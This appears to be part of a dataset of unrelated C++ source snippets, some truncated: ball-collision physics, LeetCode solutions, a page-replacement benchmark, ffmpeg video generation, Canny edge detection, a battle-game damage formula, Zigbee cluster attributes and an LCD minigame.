[](std::valarray<float> a) -> float\n\t\t{\n\t\t\treturn pow(sqrt(pow(a[0], 2) + pow(a[1], 2)), 2);\n\t\t};\n\n\t\treturn v1 - (2 * m2 / m1 + m2) *\n\t\t\t(dot(v1 - v2, c1 - c2) / vectorNorm(c1 - c2));\n\t};\n\n\tstd::valarray<float> r1 = elasticColVel(b1Vel, b2Vel, b1Mass, b2Mass, b1Pos, b2Pos);\n\n\tb1.velocity.x = r1[0];\n\tb1.velocity.y = r1[1];\n\n}\n\nbool checkCollision(Ball& b1, Ball& b2)\n{\n\tfloat dist = calcDist(b1, b2);\n\treturn (dist < (b1.getRadius() + b2.getRadius()));\n}\n\nvoid applyBallCollision(std::vector<Ball>& entityList, std::vector<Ball*>& colVector, QuadTree& q)\n{\n\t//insert objects into quadtree entity list, get potential collisions for each entity, apply collision response towards relevant objects\n\tq.clear();\n\tfor (int i = 0; i < entityList.size(); i++)\n\t{\n\t\tq.insert(entityList.at(i));\n\t}\n \n\tfor (int i = 0; i < entityList.size(); i++)\n\t{\n\t\tcolVector.clear();\n\t\tcolVector = q.getPotentialCollisions(entityList[i], colVector);\n\t\tif (colVector.size() > 0)\n\t\t{\n\t\t\tfor(int j = 0; j < colVector.size(); j++)\n\t\t\t{\n\t\t\t\tif (checkCollision(entityList[i], *colVector[j]))\n\t\t\t\t{\n\t\t\t\t\tfloat overlap = 0.5 * calcDist(entityList[i], *colVector[j]) - (entityList[i].getRadius() + colVector[j]->getRadius());\n\t\t\t\t\tfloat nxA = entityList[i].getPosition().x - overlap;\n\t\t\t\t\tfloat nyA = entityList[i].getPosition().y - overlap;\n\t\t\t\t\tfloat nxB = colVector[j]->getPosition().x + overlap;\n\t\t\t\t\tfloat nyB = colVector[j]->getPosition().y + overlap;\n\t\t\t\t\t\n\t\t\t\t\tentityList[i].setPosition(sf::Vector2f(nxA, nyA));\n\t\t\t\t\tcolVector[j]->setPosition(sf::Vector2f(nxB, nyB));\n\t\t\t\t\t\n\t\t\t\t\tcalcCol(entityList[i], *colVector[j]);\n\t\t\t\t}\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid applyBallPhysics(sf::RectangleShape& panel, std::vector<Ball>& eList, std::vector<Ball*> cVect, QuadTree &cFinder, float dT)\n{\n\t//handle ball physics\n\tfor (Ball& b : eList)\n\t{\n\t\tapplyBallCollision(eList, cVect, cFinder);\n\t\tcalcPos(b, panel, dT);\n\t}\n\n}\n\nvoid highlightButton(SUI::Button& b, sf::RenderWindow& win)\n{\n\t//highlight button if mouse is on button\n\tif (b.isHovered(win))\n\t{\n\t\tb.setColor(sf::Color::White);\n\t}\n\telse\n\t{\n\t\tb.setColor(sf::Color::Blue);\n\t}\n\t\n}\n\nbool mouseInPanel(sf::RectangleShape& panel, sf::RenderWindow& window)\n{\n\t//Check if mouse is inside panel\n\tfloat mPosX = sf::Mouse::getPosition(window).x;\n\tfloat mPosY = sf::Mouse::getPosition(window).y;\n\tfloat panX = panel.getPosition().x;\n\tfloat panY = panel.getPosition().y;\n\n\tif (mPosX > panX && mPosX <= panX + panel.getLocalBoun",
    "// 2000. Reverse Prefix of Word\n/*\nGiven a 0-indexed string word and a character ch, reverse the segment of word that starts at index 0 and ends at the index of the first occurrence of ch (inclusive). If the character ch does not exist in word, do nothing.\n\nFor example, if word = \"abcdefd\" and ch = \"d\", then you should reverse the segment that starts at 0 and ends at 3 (inclusive). The resulting string will be \"dcbaefd\".\nReturn the resulting string.\n\n\n\nExample 1:\n\nInput: word = \"abcdefd\", ch = \"d\"\nOutput: \"dcbaefd\"\nExplanation: The first occurrence of \"d\" is at index 3.\nReverse the part of word from 0 to 3 (inclusive), the resulting string is \"dcbaefd\".\nExample 2:\n\nInput: word = \"xyxzxe\", ch = \"z\"\nOutput: \"zxyxxe\"\nExplanation: The first and only occurrence of \"z\" is at index 3.\nReverse the part of word from 0 to 3 (inclusive), the resulting string is \"zxyxxe\".\nExample 3:\n\nInput: word = \"abcd\", ch = \"z\"\nOutput: \"abcd\"\nExplanation: \"z\" does not exist in word.\nYou should not do any reverse operation, the resulting string is \"abcd\".\n\n\nConstraints:\n\n1 <= word.length <= 250\nword consists of lowercase English letters.\nch is a lowercase English letter.\n*/\n\n// Solution\n\nclass Solution\n{\npublic:\n    string reversePrefix(string word, char ch)\n    {\n        int n = word.size();\n        int index = 0;\n        for (int i = 0; i < n; i++)\n        {\n            if (word[i] == ch)\n            {\n                index = i;\n                break;\n            }\n        }\n        string ans = \"\";\n        for (int i = index; i >= 0; i--)\n        {\n            ans += word[i];\n        }\n        for (int i = index + 1; i < n; i++)\n        {\n            ans += word[i];\n        }\n\n        return ans;\n    }\n};",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <queue>\n#include \"LFR.h\"\n#include \"OPT.h\"\n#include \"Clock.h\"\n#include \"FIFO.h\"\n#include \"LRU.h\"\n#include \"SecondChance.h\"\n#include <iomanip>\n\nstd::queue<int> generate_queue();\n\nint main() {\n    std::queue<int> q = generate_queue();\n\n    std::cout << \"size  \"\n              << \"hit_rate_LFR  \"\n              << \"hit_rate_OPT  \"\n              << \"hit_rate_CLOCK  \"\n              << \"hit_rate_FIFO  \"\n              << \"hit_rate_SC  \"\n              << \"hit_rate_LRU\" << std::endl;\n\n    for (int size = 4; size < 32; size++) {\n        std::cout << size;\n        if (size < 10) std::cout << \" \";\n        std::cout << std::setw(13) << std::setprecision(4) << std::showpoint \n                  << (double)LFR(q, size) / 3.2 << \"%\"  // \u5047\u8bbeLFR\u51fd\u6570\u5df2\u5b9a\u4e49\n                  << std::setw(13) << (double)OPT(q, size) / 3.2 << \"%\"  // \u5047\u8bbeOPT\u51fd\u6570\u5df2\u5b9a\u4e49\n                  << std::setw(13) << (double)Clock(q, size) / 3.2 << \"%\"  // \u5047\u8bbeClock\u51fd\u6570\u5df2\u5b9a\u4e49\n                  << std::setw(13) << (double)FIFO(q, size) / 3.2 << \"%\"  // \u5047\u8bbeFIFO\u51fd\u6570\u5df2\u5b9a\u4e49\n                  << std::setw(13) << (double)SecondChance(q, size) / 3.2 << \"%\"  // \u5047\u8bbeSecondChance\u51fd\u6570\u5df2\u5b9a\u4e49\n                  << std::setw(13) << (double)LRU(q, size) / 3.2 << \"%\"  // LRU\u6d4b\u8bd5\n                  << std::endl;\n    }\n\n    return 0;\n}\n\nstd::queue<int> generate_queue()\n{\n    unsigned seed = time(0);\n    srand(seed);\n    std::queue<int> q;\n    for (int i = 0; i < 64; i++)\n    {\n        int M = rand() % 320;\n        q.push(M);\n        q.push((M + 1) % 320);\n        M = rand() % (M + 2);\n        q.push(M);\n        q.push((M + 1) % 320);\n        int k = (M + 2) % 320;\n        M = k + rand() % (320 - k);\n        q.push(M);\n    }\n    return q;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {\n    }\n    ListNode(int x) : val(x), next(nullptr) {\n    }\n    ListNode(int x, ListNode *next) : val(x), next(next) {\n    }\n};\n\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {\n    }\n};\n\nclass Node {\npublic:\n    int val;\n    vector<Node *> neighbors;\n    Node() {\n        val = 0;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val) {\n        val = _val;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val, vector<Node *> _neighbors) {\n        val = _val;\n        neighbors = _neighbors;\n    }\n};\n\n/*the solution should start from below*/\n\nclass Solution {\npublic:\n    int countPrefixes(vector<string> &words, string s) {\n        int cnt = 0;\n        for (const auto &str : words)\n            if (s.find(str) == 0) cnt++;\n        return cnt;\n    }\n};",
    "#include \"video_gen.h\"\n\nvoid generate_julia_z2_video()\n{\n   std::stringstream cmd;\n   cmd << \"ffmpeg -y -framerate \" << FPS << \" -i ./Julia_z2_Frames/julia_z2_frame_%06d.bmp -c:v libx264 -pix_fmt yuv420p julia_z2.mp4\";\n\n   int ret = system(cmd.str().c_str());\n   if (ret == 0)\n   {\n      std::cout << \"Video generated successfully\\n\";\n   }\n   else\n   {\n      std::cout << \"Error generating video\\n\";\n      std::cout << \"Please ensure that ffmpeg is installed\\n The commands to install ffmpeg are:\\n sudo apt-get install ffmpeg\\n sudo snap install ffmpeg\\n\";\n   }\n}\n\nvoid generate_julia_z4_video()\n{\n   std::stringstream cmd;\n   cmd << \"ffmpeg -y -framerate \" << FPS << \" -i ./Julia_z4_Frames/julia_z4_frame_%06d.bmp -c:v libx264 -pix_fmt yuv420p julia_z4.mp4\";\n\n   int ret = system(cmd.str().c_str());\n   if (ret == 0)\n   {\n      std::cout << \"Video generated successfully\\n\";\n   }\n   else\n   {\n      std::cout << \"Error generating video\\n\";\n      std::cout << \"Please ensure that ffmpeg is installed\\n The commands to install ffmpeg are:\\n sudo apt-get install ffmpeg\\n sudo snap install ffmpeg\\n\";\n   }\n}\n\nvoid generate_turbulence_video()\n{\n   std::stringstream cmd;\n   cmd << \"ffmpeg -y -framerate \" << FPS << \" -i ./Turbulence_Frames/turbulence_frame_%06d.bmp -c:v libx264 -pix_fmt yuv420p turbulence.mp4\";\n\n   int ret = system(cmd.str().c_str());\n   if (ret == 0)\n   {\n      std::cout << \"Video generated successfully\\n\";\n   }\n   else\n   {\n      std::cout << \"Error generating video\\n\";\n      std::cout << \"Please ensure that ffmpeg is installed\\n The commands to install ffmpeg are:\\n sudo apt-get install ffmpeg\\n sudo snap install ffmpeg\\n\";\n   }\n}",
    "#include \"mtxCV.h\"\n\n#define IMAGE_WIDTH 32\n#define IMAGE_HEIGHT 24\n\n#define IMG_ARR_SIZE 768\n\nusing namespace std; //< Standard lib: vector, cout etc...\nusing namespace Eigen; //< Eigen vector and matrix manipulation\n\nconst uint8_t gaussian_N = 5; // SET Gaussian NxN kernel size, must be odd\n\nconst float cannyGradientThreshHigh = 0.7f; // ratio of largest gradient in suppressed image; edge must have gradient >= this to qualify as strong edge\nconst float cannyGradientThreshLow = 0.3f; // ratio of {cannyGradientThreshHigh OR largest gradient in suppressed image}, edge must have gradient >= this to qualify a weak edge\nconst size_t minSequenceLength = 10; //minimum sequence of edge points required to qualify being added to edgeSequenceListReturn\nconst uint8_t strongEdgeValue = 255; // candidate edges are assigned this value in the canny returned edgeMask when >= calculated dynThreshHigh\nconst uint8_t weakEdgeValue = 160; // candidate edges are assigned this value in the canny returned edgeMask when >= calculated dynThreshLow\nvector<EdgePoint> edgeCandidates; // init var to store coordinates of identified weak and strong edges in cannyEdgeDetection returned image edge mask\n\nstatic Contours allContours; // init storage for list of identified edge sequences\n\n\n// example image frame init\nstatic MatrixXi mtxImageFrame(IMAGE_HEIGHT, IMAGE_WIDTH); //example to store processed image\nstatic MatrixXi edgeMask(IMAGE_HEIGHT, IMAGE_WIDTH); //example to store image edge mask\n\nint main() {\n\tFnState fnState; // tracks state of mtxCV function result, feel free to use as applicable\n\n\t// OPTION 1: example kernel init using full 2D matrix\n\t//static Matrix<float, (int)gaussian_N, (int)gaussian_N> gaussianKernel; //example to store gaussian NxN kernel\n\t// Example generating gaussian NxN kernel into gaussianKernel\n\t//fnState = MtxCV::generateGaussianKernel<gaussian_N>(gaussianKernel);\n\n\t// OPTION 2: example init seperable kernel row and col vect for seperable convolution\n\tstatic RowVector<float, (int)gaussian_N> gaussianRowVector; //example to store gaussian NxN kernel\n\tstatic Vector<float, (int)gaussian_N> gaussianColVector; //example to store gaussian NxN kernel\n\t// Example generating seperable gaussian kernel into gaussianColVector and gaussianRowVector\n\tfnState = MtxCV::generateGaussianKernelSeperated<gaussian_N>(gaussianColVector, gaussianRowVector); \n\t//NOTE: recommend calculating vectors external to microcontroller and hard coding result, as decomposition inclusion of Eigen::SVD libraries requires large memory\n\n\n\t//load 1D array as applicable, example data of earth partial image below\n\tfloat imgArr[IMG_ARR_SIZE] = {0.497f, 0.f, 0.1f, 0.1f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f,\n\t1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f,\n\t0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n\t0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n\t0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f,\n\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 1.624f, 42.229f, 42.229f, 102.325f, 102.325f, 139.682f, 139.682f, 159.172f, 159.172f, 155.924f, 155.924f, 134.809f, 134.809f, 108.822f, 108.822f, 79.586f, 79.586f, 48.726f, 48.726f,\n\t0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 1.624f, 42.229f, 42.229f, 102.325f, 102.325f, 139.682f, 139.682f, 159.172f, 159.172f, 155.924f, 155.924f, 134.809f, 134.809f, 108.822f, 108.822f, 79.586f, 79.586f, 48.726f, 48.726f,\n\t0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 4.873f, 4.873f, 84.459f, 84.459f, 190.032f, 190.032f, 255.f, 255.f, 245.255f, 245.255f, 222.516f, 222.516f, 191.656f, 191.656f, 159.172f, 159.172f, 134.809f, 134.809f, 113.694f, 113.694f, 92.58f, 92.58f, 73.089f, 73.089f, 51.975f, 51.975f,\n\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 4.873f, 4.873f, 84.459f, 84.459f, 190.032f, 190.032f, 255.f, 255.f, 245.255f, 245.255f, 222.516f, 222.516f, 191.656f, 191.656f, 159.172f, 159.172f, 134.809f, 134.809f, 113.694f, 113.694f, 92.58f, 92.58f, 73.",
    "#include \"utils.h\"\n#include \"Ele.h\"\n#include \"Move.h\"\n#include <iostream>\n#include <random>\n#include <math.h>\n#include <time.h>\n#include <thread>\n#include <iomanip>\n\nint CalculateDamage(Ele &attacker, Ele &defender, Move& move) {\n\n    float damage = 1 + (static_cast<float>(move.Potency()) * \n            static_cast<float>(attacker.Attack()) * ( 1+ attacker.AttackModifier() * 0.1f ) /\n            static_cast<float>(defender.Defense()) * (1 + defender.DefenseModifier() * 0.1f));\n    \n    damage *= GetElemAdvantage(move.Element(), defender.Element());\n\n    if (damage < 1)\n    {\n        damage = 1;\n    }\n\n    return static_cast<int>(round(damage));\n}\n\nint RandomNumber(int min, int max) {\n    random_device rd;\n    mt19937 gen(rd());\n\n    uniform_int_distribution<int> distribution(min, max);\n\n    return distribution(gen);\n}\n\nvoid PrintText(string text, long long customTime, bool wantEndOfLine)\n{\n    for (char c : text) {\n        cout << c;\n        cout.flush();\n\n        this_thread::sleep_for(chrono::milliseconds(customTime));\n    }\n    if (wantEndOfLine) {\n        cout << endl;\n    }\n}\n\nfloat GetElemAdvantage(Elem attacker, Elem defender) {\n    switch (attacker) {\n    case Elem::Water:\n        return (defender == Elem::Fire) ? 1.5 : ((defender == Elem::Grass) ? 0.75 : 1);\n    case Elem::Fire:\n        return (defender == Elem::Grass) ? 1.5 : ((defender == Elem::Water) ? 0.75 : 1);\n    case Elem::Grass:\n        return (defender == Elem::Water) ? 1.5 : ((defender == Elem::Fire) ? 0.75 : 1);\n    default:\n        return 1;\n    }\n}\n",
    "//#include <Arduino.h>\r\n#include \"esp_log.h\"\r\n#include \"zcl/esp_zigbee_zcl_command.h\"\r\n#include \"zb_zcl.h\"\r\n#include \"zb_defs.h\"\r\n\r\n#define TAG \"zb_zcl\"\r\n\r\nzb_cluster_info_t *clusters = NULL;\r\n\r\nvoid addClusterAttrs(uint16_t clusterId, zb_attr_info_t *attrs, uint16_t count) \r\n{\r\n  zb_cluster_info_t *cluster = (zb_cluster_info_t *) malloc(sizeof(zb_cluster_info_t));\r\n  cluster->clusterId = clusterId;\r\n  cluster->attrs = attrs;\r\n  cluster->attrCount = count;\r\n  cluster->next = clusters;\r\n  clusters = cluster;\r\n}\r\n\r\nuint8_t uint8Unknown = 0x80;\r\nuint16_t uint16Unknown = 0x8000;\r\nuint32_t uintZero = 0;\r\nuint32_t uintFFFF = 0xffffffff;\r\nuint8_t boolFalse = 0;\r\nuint8_t boolTrue = 1;\r\n\r\nvoid fillInfo()\r\n{\r\n  #ifdef USE_BASIC_CLUSTER\r\n    static uint8_t zclVersion = 3;\r\n    static zb_attr_info_t a0[] = {\r\n      {ESP_ZB_ZCL_ATTR_BASIC_ZCL_VERSION_ID,                  ESP_ZB_ZCL_ATTR_TYPE_U8,           ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  true,  &zclVersion}, \r\n      {ESP_ZB_ZCL_ATTR_BASIC_APPLICATION_VERSION_ID,          ESP_ZB_ZCL_ATTR_TYPE_U8,           ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_STACK_VERSION_ID,                ESP_ZB_ZCL_ATTR_TYPE_U16,          ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_HW_VERSION_ID,                   ESP_ZB_ZCL_ATTR_TYPE_U16,          ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_MANUFACTURER_NAME_ID,            ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_MODEL_IDENTIFIER_ID,             ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_DATE_CODE_ID,                    ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_POWER_SOURCE_ID,                 ESP_ZB_ZCL_ATTR_TYPE_8BIT_ENUM,    ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  true,  &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_GENERIC_DEVICE_CLASS_ID,         ESP_ZB_ZCL_ATTR_TYPE_8BIT_ENUM,    ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, &uintFFFF},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_GENERIC_DEVICE_TYPE_ID,          ESP_ZB_ZCL_ATTR_TYPE_8BIT_ENUM,    ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, &uintFFFF},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_PRODUCT_CODE_ID,                 ESP_ZB_ZCL_ATTR_TYPE_OCTET_STRING, ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_PRODUCT_URL_ID,                  ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_MANUFACTURER_VERSION_DETAILS_ID, ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_SERIAL_NUMBER_ID,                ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_PRODUCT_LABEL_ID,                ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_LOCATION_DESCRIPTION_ID,         ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_WRITE, false, NULL},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_PHYSICAL_ENVIRONMENT_ID,         ESP_ZB_ZCL_ATTR_TYPE_8BIT_ENUM,    ESP_ZB_ZCL_ATTR_ACCESS_READ_WRITE, false, &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_DEVICE_ENABLED_ID,               ESP_ZB_ZCL_ATTR_TYPE_BOOL,         ESP_ZB_ZCL_ATTR_ACCESS_READ_WRITE, false, &boolTrue},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_ALARM_MASK_ID,                   ESP_ZB_ZCL_ATTR_TYPE_8BITMAP,      ESP_ZB_ZCL_ATTR_ACCESS_READ_WRITE, false, &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_DISABLE_LOCAL_CONFIG_ID,         ESP_ZB_ZCL_ATTR_TYPE_8BITMAP,      ESP_ZB_ZCL_ATTR_ACCESS_READ_WRITE, false, &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_BASIC_SW_BUILD_ID,                     ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING,  ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, NULL}\r\n    };\r\n    addClusterAttrs(ESP_ZB_ZCL_CLUSTER_ID_BASIC, a0, sizeof(a0)/sizeof(zb_attr_info_t));\r\n  #endif // USE_BASIC_CLUSTER\r\n\r\n  #ifdef USE_IDENTIFY_CLUSTER\r\n    static zb_attr_info_t a3[] = {\r\n      {ESP_ZB_ZCL_ATTR_IDENTIFY_IDENTIFY_TIME_ID, ESP_ZB_ZCL_ATTR_TYPE_U8, ESP_ZB_ZCL_ATTR_ACCESS_READ_WRITE, true, &uint8Unknown}\r\n    };\r\n    addClusterAttrs(ESP_ZB_ZCL_CLUSTER_ID_IDENTIFY, a3, sizeof(a3)/sizeof(zb_attr_info_t));\r\n  #endif // USE_IDENTIFY_CLUSTER\r\n\r\n  #ifdef USE_ON_OFF_CLUSTER\r\n    static zb_attr_info_t a6[] = {\r\n      {ESP_ZB_ZCL_ATTR_ON_OFF_ON_OFF_ID,            ESP_ZB_ZCL_ATTR_TYPE_BOOL,      ESP_ZB_ZCL_ATTR_ACCESS_RPS, true, &boolFalse}, \r\n      {ESP_ZB_ZCL_ATTR_ON_OFF_GLOBAL_SCENE_CONTROL, ESP_ZB_ZCL_ATTR_TYPE_BOOL,      ESP_ZB_ZCL_ATTR_ACCESS_READ_ONLY,  false, &boolTrue},\r\n      {ESP_ZB_ZCL_ATTR_ON_OFF_ON_TIME,              ESP_ZB_ZCL_ATTR_TYPE_U16,       ESP_ZB_ZCL_ATTR_ACCESS_READ_WRITE, false, &uintZero},\r\n      {ESP_ZB_ZCL_ATTR_ON_OFF_OFF_WAIT_TIME,        ESP_ZB_ZCL_ATTR_TYPE_U16,       ESP_ZB_ZCL_ATTR_ACCE",
    "#include \"MinigameEngine.h\"\r\n\r\nconst int MinigameEngine::Apple[6][5]= {\r\n    { 0,0,1,1,0, },\r\n    { 0,0,1,0,0, },\r\n    { 0,1,1,1,0, },\r\n    { 1,1,1,1,1, },\r\n    { 1,1,1,1,1, },\r\n    { 0,1,1,1,0, },\r\n    \r\n};\r\n\r\nMinigameEngine::MinigameEngine(N5110 &lcd, Joystick &joystick)\r\n    : _lcd(lcd), _joystick(joystick), _player_pos({42, 24}), _game_running(false), _collectible_active(false), _points_flag(false), _points(0), _next_collectible_time(5.0) {}\r\n\r\nvoid MinigameEngine::start_game() {\r\n    _timer.start();\r\n    _collectible_active = false;\r\n    _points = 0;\r\n    _next_collectible_time = 5.0;\r\n}\r\n\r\nvoid MinigameEngine::update_game() {\r\n    //_timer.start();\r\n    while (_timer.read() <= 25 && _points < 3) {\r\n        _game_running = true;\r\n        if (_timer.read() >= _next_collectible_time && !_collectible_active) {\r\n            _collectible_pos.x = rand() % 77; //randomise pos\r\n            _collectible_pos.y = rand() % 41;\r\n            _collectible_active = true;\r\n            _next_collectible_time += 5.0;\r\n        }\r\n\r\n        _lcd.clear();\r\n        _lcd.drawRect(0, 0, 84, 48, FILL_TRANSPARENT);\r\n        _lcd.drawRect(_player_pos.x, _player_pos.y, 2, 2, FILL_BLACK);\r\n\r\n        if (_collectible_active) {\r\n           _lcd.drawSprite(_collectible_pos.x, _collectible_pos.y, 6, 5, (int*)Apple);\r\n        }\r\n\r\n        move();\r\n        check_collect();\r\n        boundary();\r\n\r\n        _lcd.refresh();\r\n        ThisThread::sleep_for(30ms);\r\n\r\n        if (_points == 3) {\r\n            _points_flag = true;\r\n        }\r\n    }\r\n    \r\n}\r\n\r\nvoid MinigameEngine::reset_game() {\r\n    _timer.stop();\r\n    _timer.reset();\r\n    _collectible_active = false;\r\n    _points = 0;\r\n    _game_running = false;\r\n    \r\n}\r\n\r\nvoid MinigameEngine::set_game_running(volatile bool game_running) {\r\n    _game_running = game_running;\r\n\r\n}\r\n\r\nvoid MinigameEngine::set_points_flag(bool points_flag) {\r\n    _points_flag = points_flag;\r\n}\r\n\r\nbool MinigameEngine::get_points_flag() {\r\n    return _points_flag;\r\n}\r\n\r\nbool MinigameEngine::get_game_running() {\r\n    return _game_running;\r\n}\r\n\r\nvoid MinigameEngine::move() {\r\n    if (_joystick.get_direction() == N) {\r\n        _player_pos.y--;\r\n    }\r\n    else if (_joystick.get_direction() == S) {\r\n        _player_pos.y++;\r\n    }\r\n    else if (_joystick.get_direction() == E) {\r\n        _player_pos.x++;\r\n    }\r\n    else if (_joystick.get_direction() == W) {\r\n        _player_pos.x--;\r\n    }\r\n    else if (_joystick.get_direction() == NE) {\r\n        _player_pos.y--;\r\n        _player_pos.x++;\r\n    }\r\n    else if (_joystick.get_direction() == NW) {\r\n        _player_pos.y--;\r\n        _player_pos.x--;\r\n    }\r\n    else if (_joystick.get_direction() == SE) {\r\n        _player_pos.y++;\r\n        _player_pos.x++;\r\n    }\r\n    else if (_joystick.get_direction() == SW) {\r\n        _player_pos.y++;\r\n        _player_pos.x--;\r\n    }\r\n    \r\n}\r\n\r\nvoid MinigameEngine::check_collect() {\r\n    if (_collectible_active && _player_pos.x >= _collectible_pos.x && _player_pos.x <= _collectible_pos.x + 5 && _player_pos.y >= _collectible_pos.y && _player_pos.y <= _collectible_pos.y + 6) {\r\n        _collectible_active = false;\r\n        _points++;\r\n    }\r\n}\r\n\r\nvoid MinigameEngine::boundary() {\r\n    if (_player_pos.x < 1) _player_pos.x = 1;\r\n    else if (_player_pos.x > 81) _player_pos.x = 81;\r\n\r\n    if (_player_pos.y < 1) _player_pos.y = 1;\r\n    else if (_player_pos.y > 45) _player_pos.y = 45;\r\n}",
